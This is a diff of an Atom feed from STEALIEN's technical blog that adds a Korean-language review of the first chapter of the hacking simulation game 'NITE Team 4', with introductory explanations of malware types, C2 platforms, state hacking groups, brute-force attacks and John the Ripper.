@@ -1,4 +1,343 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2022-12-19T22:12:43+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">Analyzing Django ORM with 1-day vulnerabilities and sql bug</title><link href="http://ufo.stealien.com/id/2022-12-16/analyzing-django-orm-with-1-day" rel="alternate" type="text/html" title="Analyzing Django ORM with 1-day vulnerabilities and sql bug" /><published>2022-12-16T00:00:00+09:00</published><updated>2022-12-16T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-12-16/analyzing-django-orm-with-1-day-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-12-16/analyzing-django-orm-with-1-day">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="http://ufo.stealien.com/id/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ufo.stealien.com/id/" rel="alternate" type="text/html" /><updated>2023-03-21T00:45:33+09:00</updated><id>http://ufo.stealien.com/feed.xml</id><title type="html">STEALIEN Technical Blog</title><subtitle>첨단기술을 간편하게 제공하는 기업, 스틸리언이 운영하는 기술블로그입니다.</subtitle><entry xml:lang="ko"><title type="html">NITE Team 4: OPERATION CASTLE IVY Chapter 1 리뷰</title><link href="http://ufo.stealien.com/id/2023-03-19/nite-team-4-operation-castle-ivy-chapter-1" rel="alternate" type="text/html" title="NITE Team 4: OPERATION CASTLE IVY Chapter 1 리뷰" /><published>2023-03-19T00:00:00+09:00</published><updated>2023-03-19T00:00:00+09:00</updated><id>http://ufo.stealien.com/2023-03-19/nite-team-4-operation-castle-ivy-chapter-1</id><content type="html" xml:base="http://ufo.stealien.com/2023-03-19/nite-team-4-operation-castle-ivy-chapter-1">&lt;h1 id=&quot;nite-team-4&quot;&gt;NITE Team 4&lt;/h1&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/nite-team-4.webp&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;NITE Team 4&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;“NITE Team 4”는 플레이어가 군의 해킹 부서에서 오퍼레이터로 근무하며 지시에 따라 해킹 작전을 수행하는 것을 간접적으로 체험해 볼 수 있는 시뮬레이션 게임입니다.&lt;/p&gt;
+
+&lt;p&gt;플레이어는 스토리/캠페인의 목적에 따라 적합한 해킹 도구를 사용하여 첩보를 수집하고 분석하는 것으로 마치 퍼즐을 푸는 것 처럼 게임을 진행할 수 있습니다.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;stinger-os&quot;&gt;STINGER OS&lt;/h1&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/stinger-os.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;STINGER OS&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;“NITE Team 4”에서는 &lt;em&gt;STINGER OS&lt;/em&gt;라고 부르는 다양한 해킹 도구가 포함된 운영체제를 이용하여 작전을 수행하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;앞으로 STINGER OS를 이용하여 작전의 목적에 따라 대상을 해킹하고, 첩보를 처리, 분석하게 될 것입니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;-운영체제-os-operating-system&quot;&gt;🔎 운영체제 (OS, Operating System)&lt;/h2&gt;
+
+&lt;p&gt;우리가 많이 사용하는 웹 브라우져, 파일 탐색기, 문서 편집기 등을 “응용 프로그램”이라고 부릅니다.&lt;/p&gt;
+
+&lt;p&gt;“응용 프로그램”을 잘 실행시키고, 편리하게 사용기기 위해서는 “운영체제”가 필요합니다.&lt;/p&gt;
+
+&lt;p&gt;여러분이 웹 브라우져로 여러개의 탭을 이용하여 웹 서핑을 할 수 있는 이유도, 파일을 복사하여 문서에 붙여넣을 수 있는 이유도, 결국 이 “운영체제”가 그런 기능을 구현하고, 응용할 수 있도록 만들어 주기 때문입니다.&lt;/p&gt;
+
+&lt;p&gt;우리가 실제로 많이 쓰는 운영체제로는 &lt;em&gt;Microsoft Windows&lt;/em&gt;, &lt;em&gt;Apple macOS&lt;/em&gt;가 있죠.&lt;/p&gt;
+
+&lt;p&gt;모바일 디바이스에서는 &lt;em&gt;Google Android&lt;/em&gt;, &lt;em&gt;Apple iOS&lt;/em&gt;가 있을 수 있겠네요.&lt;/p&gt;
+
+&lt;h2 id=&quot;-해킹을-위한-os&quot;&gt;🔎 해킹을 위한 OS&lt;/h2&gt;
+
+&lt;p&gt;“NITE Team 4”의 STINGER OS처럼, 현실에도 해킹을 위한 OS가 존재합니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/kali-linux.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Kali Linux&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.kali.org/get-kali/&quot;&gt;Kali Linux&lt;/a&gt;는 Offensive Security사에서 개발한 해킹을 위한 OS입니다.&lt;/p&gt;
+
+&lt;p&gt;Linux라는 OS를 기반하고 있으며, 앞으로 “NITE Team 4”에서 사용할 많은 도구들 중 일부들가 kali Linux에 포함된 도구를 벤치마킹하고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;하지만 Kali Linux는 STINGER OS와 다르게 해킹의 전반적인 작업들을 자동화 해 주지는 못합니다. Kali Linux에는 해킹을 위한 다양한 오픈소스 도구들이 집합되어 있을 뿐, 실제로 해킹을 수행하기 위해서는 각 도구의 원리와 사용 방법에 대한 이해가 필요합니다.&lt;/p&gt;
+
+&lt;p&gt;현실에서는 이 Kali Linux를 기업 또는 단체에서 모의해킹, 침투 테스팅, 레드팀을 이용한 정보 보안 강화에 많이 사용하고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;비슷한 OS로는 &lt;a href=&quot;https://blackarch.org/&quot;&gt;Black Arch Linux&lt;/a&gt;, &lt;a href=&quot;https://www.parrotsec.org/&quot;&gt;Parrot OS&lt;/a&gt;가 있습니다.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;operation-castle-ivy&quot;&gt;OPERATION CASTLE IVY&lt;/h1&gt;
+
+&lt;p&gt;STINGER OS에 대한 교육이 끝난 후, operator는 실제 작전에 투입됩니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;intro&quot;&gt;INTRO&lt;/h2&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/intro.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Operation CASTLE IVY Intro&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;상부는 “NITE Team 4”의 군용 멀웨어가 도난 당했음을 확인했습니다.&lt;br /&gt;
+SAD는 Bureau 121의 소행으로 추정하고 있지만, 뒷덜미를 잡을만한 증거가 부족합니다.&lt;br /&gt;
+2017년 NSA의 익스플로잇 유출로 10B$ 추정의 손해가 있었던 만큼, 빠르게 이를 조사해야합니다.
+우리는 현장에 남겨진 증거들을 활용하여 얼마만큼의 유출이 발생했는지 확인해야 합니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;-malware---멀웨어-악성코드&quot;&gt;🔎 Malware - 멀웨어, 악성코드&lt;/h3&gt;
+
+&lt;p&gt;Malware는 Malicious Software, 즉 악성 소프트웨어 또는 악성 코드의 줄임말입니다.&lt;/p&gt;
+
+&lt;p&gt;Malware는 그 특성에 따라 분류되고 있으며, 대표적인 몇가지를 소개 드리겠습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-backdoor&quot;&gt;🔎 Backdoor&lt;/h4&gt;
+
+&lt;p&gt;시스템에서 Backdoor가 실행될 경우, 악성 행위자는 Backdoor가 설치된 시스템에 마치 뒷문을 드나들 듯 인증 과정 또는 반드시 수행 해야하는 절차 없이 시스템의 핵심 명령 장치 등에 접근할 수 있게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;Backdoor를 통해 악성 행위자는 웹캠을 통한 실시간 감시, 실시간 화면 녹화 또는 다른 악성 코드를 설치할 수 있게 되며, 내부망의 다른 대상으로 공격을 뻗쳐 나갈 수도 있게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;악성 행위자는 Backdoor를 통해 과거에 장악했던 시스템에 대해서 다시 공격하여 장악할  수고를 덜 수 있을 뿐더러, 추가적인 공격으로 이어 나갈 수 있는 가능성 덕분에 많이 사용되고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;소프트웨어나 제품에 기본적으로 탑재되는 형식의 Backdoor 공격 사례 또한 다수 존재합니다.&lt;/p&gt;
+
+&lt;p&gt;유명한 Backdoor로는 &lt;a href=&quot;https://www.pangulab.cn/en/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/&quot;&gt;“The Bvp47 - Equation Group”&lt;/a&gt;, &lt;a href=&quot;https://ipvm.com/reports/hik-exploit&quot;&gt;“IPVM - Hikvision Backdoor Exploit”&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/fs0c131y/status/1085460755313508352&quot;&gt;“ES File Explorer Backdoor”&lt;/a&gt;가 있습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-infostealer&quot;&gt;🔎 InfoStealer&lt;/h4&gt;
+
+&lt;p&gt;시스템에서 InfoStealer가 실행될 경우 시스템에 저장되어 있는 문서, 비트코인 지갑, 패스워드 등 민감 정보를 추출하여 악성 행위자에게 전송합니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-ransomware&quot;&gt;🔎 Ransomware&lt;/h4&gt;
+
+&lt;p&gt;Ransomware는 몸값이라는 뜻의 ransom과 software의 합성어로, Ransomware가 설치된 시스템의 파일들을 악성 행위자만이 알고 있는 패스워드로 암호화하고 인질로 만들어 피해자에게 금전을 요구하도록 유도하는 악성코드입니다.&lt;/p&gt;
+
+&lt;p&gt;Ransomware는 InfoStealer의 기능을 포함하기도 합니다.&lt;/p&gt;
+
+&lt;p&gt;최근에는 기업 대상 공격으로 - 핵심 기술 또는 데이터를 유출하겠다고 협박하며 추가적인 금전을 요구하는 형태로도 발전하고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;또한, 랜섬웨어를 큰 노력 안들이며 만들어주고, 피해자를 관리하는 서비스를 제공하는 등 Ransomware as a Service(RaaS)의 형태로 랜섬웨어 조직은 확장되고 있습니다. 랜섬웨어를 이용하고자 하는 공격자는 랜섬웨어를 직접 제작할 필요 없이 일부 수익만 공유하면 손쉽게 공격에 랜섬웨어를 이용할 수 있습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-malware-참고-자료-references&quot;&gt;🔎 Malware 참고 자료 (References)&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.ahnlab.com/kr/site/securityinfo/securityinfoMain.do&quot;&gt;Ahnlab ASEC&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.igloo.co.kr/security-information/2022%eb%85%84-%ec%82%ac%ec%9d%b4%eb%b2%84-%eb%b3%b4%ec%95%88%ec%9c%84%ed%98%91%ec%97%90-%eb%94%b0%eb%a5%b8-%ec%95%85%ec%84%b1%ec%bd%94%eb%93%9c-%ed%8c%a8%eb%9f%ac%eb%8b%a4%ec%9e%84/&quot;&gt;IGLOO, “2022년 사이버 보안위협에 따른 악성코드 패러다임”&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-cia-sad&quot;&gt;🔎 CIA SAD&lt;/h3&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/cia-sad-pag.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;CIA SAD/PAG&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;“NITE Team 4”에서 언급한 SAD가 CIA의 SAD인지는 확실하지 않습니다.&lt;/p&gt;
+
+&lt;p&gt;하지만 미국의 중앙 정보국(Central Intelligence Agency, CIA)에는 특수 활동 부서(Special Activities Division, SAD)가 있으며, SAD의 정치적 작전 그룹(Political Action Group, PAG)의 주요 작전 범위에 사이버 전쟁이 포함되어 있습니다.&lt;/p&gt;
+
+&lt;p&gt;현재는 특수 활동 본부(Special Activities Center, SAC)라고 불리고 있습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-cia-sad-참고-자료-references&quot;&gt;🔎 CIA SAD 참고 자료 (References)&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://greydynamics.com/cia_special_activities_center&quot;&gt;grey dynamics, “CIA Special Activities Center: The Third Option”&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.operationmilitarykids.org/cia-special-activities-division-sad/#cia-branches&quot;&gt;Operation Military Kids, “CIA Speical Activities Division (SAD)”&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-bureau-121---정찰총국-121국&quot;&gt;🔎 Bureau 121 - 정찰총국 121국&lt;/h3&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/sony-gop-hacked.webp&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Sony Pictures 해킹 사건 당시 Sony Pictures의 웹사이트&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Bureau 121은 북한의 정찰총국 121국으로 불리며, 북한의 사이버 전쟁을 위한 집단입니다.
+2014년 소니 픽쳐스 해킹의 배후로 잘 알려져 있습니다.&lt;/p&gt;
+
+&lt;p&gt;6,000명 이상의 인원으로 구성되어 있으며, 각 Andariel, Bluenoroff, Lazarus라고 불리는 악성 행위자 그룹이 121국에 속해 있는것으로 파악하고 있습니다. (2021)&lt;/p&gt;
+
+&lt;p&gt;121국의 악성 행위자들은 중국, 인도, 러시아, 벨라루스, 말레이시아와 같은 여러 국가들을 거점으로 활동하고 있는 것으로 알려져 있습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-bureau-121-참고-자료-references&quot;&gt;🔎 Bureau 121 참고 자료 (References)&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.hhs.gov/sites/default/files/dprk-cyber-espionage.pdf&quot;&gt;U.S. Department of Health &amp;amp; Human Service, “North Korean Cyber Activity”&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cnas.org/publications/reports/exposing-the-financial-footprints-of-north-koreas-hackers&quot;&gt;Center for a New American Security, “Exposing the Financial Footprints of North Korea’s Hackers”&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-the-shadow-brokers-leak&quot;&gt;🔎 The Shadow Brokers Leak&lt;/h3&gt;
+
+&lt;p&gt;2016년, “The Shadow Brokers” 해커 그룹이 “Equation Group” 해커 그룹을 해킹하여, 그들의 해킹 도구를 탈취하고, 경매에 부치고, 유출시킨 사건이 발생했습니다.&lt;/p&gt;
+
+&lt;p&gt;“Equation Group”은 이란의 우라늄 농축 시설 파괴를 목표로한 “Stuxnet” 악성코드를 개발하는 등 당시 최고의 기술력을 가지고 있는 해커 집단으로 잘 알려져 있었습니다.&lt;/p&gt;
+
+&lt;p&gt;또한, “Equation Group”은 미국 국가안보국(National Security Agency, NSA)의 TAO(Tailored Access Operations)가 “Equation Group”의 배후라고 생각되기도 합니다.&lt;/p&gt;
+
+&lt;p&gt;이 유출 사건으로 인해 “Equation Group”의 핵심 해킹 기술과 도구들이 대거 유출되고 악영되며 사회에 큰 파장을 일으켰습니다.&lt;/p&gt;
+
+&lt;h4 id=&quot;-the-shadow-brokers-leak-참고-자료-references&quot;&gt;🔎 The Shadow Brokers Leak 참고 자료 (References)&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Equation_Group&quot;&gt;Wikipedia, “Equation Group”&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cnas.org/publications/reports/exposing-the-financial-footprints-of-north-koreas-hackers&quot;&gt;Wikipedia, “The Shadow Brokers”&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/WannaCry_ransomware_attack&quot;&gt;Wikipedia, “WannaCry”&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;chapter-1-브리핑&quot;&gt;Chapter 1, 브리핑&lt;/h2&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-breifing.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Chapter 1 브리핑&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;배경&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;“NITE Team 4”는 미정부와 협력하에 Turbine C2 Platform을 운영중이다.&lt;/li&gt;
+  &lt;li&gt;“Turbine C2 Platform”은 네트워크를 통해 다수의 implant를 관리하는 플랫폼이다.&lt;/li&gt;
+  &lt;li&gt;Malware가 implant(설치)되면, 자동으로 Turbine C2 Card의 형태로 플랫픔/시스템에 등록된다.&lt;/li&gt;
+  &lt;li&gt;각각의 Turbine C2 Card는 관리되는 고유한 ID와 접근 권한 코드를 가지고 있다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;상황&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;4시간 전, BloodDove라는 멀웨어가 어떤 대상에 설치되어 식별되지 않은 ID를 통해 활성화된 것을 포착했다.&lt;/li&gt;
+  &lt;li&gt;이 멀웨어는 현재 “NITE Team 4”에서 진행되고 있는 작전들과 아무런 연관성이 없는 것으로 파악된다.&lt;/li&gt;
+  &lt;li&gt;따라서, 이 사건에 대하여 조사가 필요하다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;목표&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;미식별된 C2 card에 접근한다.&lt;/li&gt;
+  &lt;li&gt;공유 디렉토리를 식별하고 접근 권한을 획득한다.&lt;/li&gt;
+  &lt;li&gt;BloodDove 멀웨어의 실제 위치를 파악한다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;turbine-c2-platform&quot;&gt;Turbine C2 Platform&lt;/h3&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/turbine-c2.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Turbine C2 Platform&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;게임에서 Turbine C2 Platform을 통해 작전 대상 네트워크에 접근할 수 있습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;-command--control-aka-cc-or-c2&quot;&gt;🔎 Command &amp;amp; Control (a.k.a C&amp;amp;C or C2)&lt;/h3&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/c2-diagram.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;C2 Diagram&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;공격자는 C2 서버를 공격의 경유지로 사용하거나, 멀웨어로 감염된 디바이스들을 원격에서 관리하는 등의 역할을 수행합니다.&lt;/p&gt;
+
+&lt;p&gt;현실에는 &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt;, &lt;a href=&quot;https://www.cobaltstrike.com/&quot;&gt;CobaltStrike&lt;/a&gt;와 같은 상용 침투 테스팅 도구에 포함되어 있거나, &lt;a href=&quot;https://github.com/tcostam/awesome-command-control&quot;&gt;오픈소스&lt;/a&gt;의 형태로도 존재합니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;chapter-1-workaround&quot;&gt;Chapter 1, Workaround&lt;/h2&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-1.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Connected to OPERATION CASTLE IVY network.&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;우선, 위와 같이 작전 대상 네트워크에 진입합니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-2.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;netscan result&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Information Gathering Module -&amp;gt; WMI Scanner&lt;/code&gt;를 실행 후, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netscan&lt;/code&gt; 명령을 입력하여 현재 네트워크에서 접근 가능한 WMI path를 확인합니다.&lt;/p&gt;
+
+&lt;p&gt;WMI path 중, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/nlightman/c$&lt;/code&gt;가 존재하는 것을 알 수 있는데, 이 문자열을 통해 다음과 같은 사실을 추측할 수 있습니다:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;사용자 ID가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nlightman&lt;/code&gt;이다.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c$&lt;/code&gt;는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; 드라이브 오브젝트를 나타낸다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;따라서 해당 경로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nlightman&lt;/code&gt; 사용자의 드라이브에 접근할 수 있는 WMI path일 가능성이 높습니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-3.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;password attack 1&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network Intrusion -&amp;gt; Password Attack&lt;/code&gt;을 실행하고, 아까 확보한 경로와 아이디를 입력합니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-4.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;password attack 2&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;여기서, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John The Ripper&lt;/code&gt; 파라미터를 선택합니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-5.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;password attack 3&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-6.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;password attack 4&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;위와 같이 성공적으로 패스워드 공격을 수행했습니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-7.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;file browser connect 1&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data Forensic -&amp;gt; File Browser&lt;/code&gt;를 실행 후, 아까 확보한 경로를 입력하고 연결을 시도합니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-8.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;file browser connect 2&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Password Attack 단계에서 확보한 계정의 패스워드를 입력하여 대상의 파일에 접근할 수 있습니다.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2023-03-19-nite-team-4-operation-castle-ivy-chapter-1/chapter1-9.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;file browser connect 3&lt;/i&gt;
+&lt;/p&gt;
+
+&lt;p&gt;최종적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodDove&lt;/code&gt;와 함께, 다른 수상한 멀웨어들도 발견했습니다.&lt;/p&gt;
+
+&lt;p&gt;이후에는 지시에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uni74455.dll&lt;/code&gt;을 다운로드 받으면 임무가 완료됩니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;-wmi-scanner&quot;&gt;🔎 WMI scanner&lt;/h3&gt;
+
+&lt;p&gt;WMI는 Windows Management Instrumentation라는 뜻의 Windows OS 관리 시스템입니다.&lt;/p&gt;
+
+&lt;p&gt;공격자는 WMI를 통해 내부망에서 장악한 시스템템 원격지의 윈도우 시스템의 취약점과 노출 부분을 파악하고, 침투한 시스템에서부터 공격을 확장하는 등에 사용할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;게임에서는 단순히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netscan&lt;/code&gt;을 이용하여 현재 네트워크에 공격 가능한 지점이 어디 있는지 파악하는 용도로 사용할 수 있습니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;-bruteforce-공격&quot;&gt;🔎 Bruteforce 공격&lt;/h3&gt;
+
+&lt;p&gt;무작위 대입 공격이라고도 부르는 Bruteforce 공격은 어떤 암호, 인증 등을 통과하기 위해 가능한 모든 키를 사용하여 대입해보는 아주 무식한 공격 기법 중 하나입니다.&lt;/p&gt;
+
+&lt;p&gt;무식해 보이는 Bruteforce 공격 기법에도 몇가지 방법들이 있는데요, 말 그대로 모든 가능한 값을 대입하는 방식, 사전(Dictionary)의 데이터를 하나씩 대입하는 이 두가지 방식이 대표적입니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;-john-the-ripper&quot;&gt;🔎 John The Ripper&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/openwall/john&quot;&gt;John The Ripper&lt;/a&gt;는 유명한 오픈소스 패스워드 해킹 툴입니다 - 정확히는 패스워드의 해쉬를 해킹하여 패스워드 원문을 알아내는 도구입니다.&lt;/p&gt;
+
+&lt;p&gt;패스워드를 시스템에 저장 할 때는 악의적인 의도를 가진 시스템 관리자, 개발자 또는 어떤 해킹이나 유출 사건으로부터 패스워드 원문을 보호하기 위해 해쉬 함수를 이용하여 고정된 길이의 (랜덤하게 보이는) 데이터로 변환시킵니다.&lt;/p&gt;
+
+&lt;p&gt;John The Ripper는 이 해쉬 함수를 통해 생성된 해쉬로부터 원문의 패스워드를 알아내도록 도와주는 도구입니다.&lt;/p&gt;
+
+&lt;p&gt;게임에서는 네트워크 서비스의 어떤 ID에 대응하는 패스워드를 bruteforce로 알아내기 위해 사용되는 사전(Dictionary)의 종류로 등장합니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;-rockyoutxt&quot;&gt;🔎 rockyou.txt&lt;/h3&gt;
+
+&lt;p&gt;RockYou라는 IT 서비스 업체가 해킹 공격을 당해 그 고객들의 패스워드가 원문으로 노출된 적 있습니다.&lt;/p&gt;
+
+&lt;p&gt;RockYou는 고객들의 패스워드를 원문(plain-text) 형태로 저장하여 그들의 시스템에서 사용하였으며, 이것이 유출된 것입니다.&lt;/p&gt;
+
+&lt;p&gt;총 3200만개 가량의 패스워드가 유출 되었으며, 공격자들은 이 데이터셋을 bruteforcing 공격에 종종 이용하고는 합니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
+
+&lt;p&gt;“NITE Team 4”를 통해 해킹의 가장 기본적인 도구와 개념들에 대해 알아볼 수 있었습니다.&lt;/p&gt;
+
